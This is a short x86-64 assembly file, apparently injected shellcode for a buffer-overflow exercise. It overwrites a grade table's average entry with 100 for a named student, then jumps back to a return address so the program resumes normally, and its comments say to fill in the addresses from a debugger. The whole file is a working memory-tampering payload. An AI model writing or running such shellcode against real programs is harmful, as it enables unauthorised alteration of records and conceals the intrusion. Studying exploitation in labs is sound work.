.text
.globl _start
_start:
    # Minimal shellcode - just set the AVG directly to 100
    # For Akarca_Tolga (student index 0 in section C)
    
    # Set AVG (row 25, column 0) to 100
    # Address = cGrades_base + (25 * 100 + 0) * 4 = cGrades_base + 10000
    movabs $0x555555560140, %rax    # REPLACE with actual cGrades base from: p &cGrades
    addq $10000, %rax               # Offset to row 25 (AVG row)
    movl $100, (%rax)               # Set average to 100
    
    # Return to normal execution
    movabs $0x555555555432, %rax    # REPLACE with address after getUserLine call
    jmp *%rax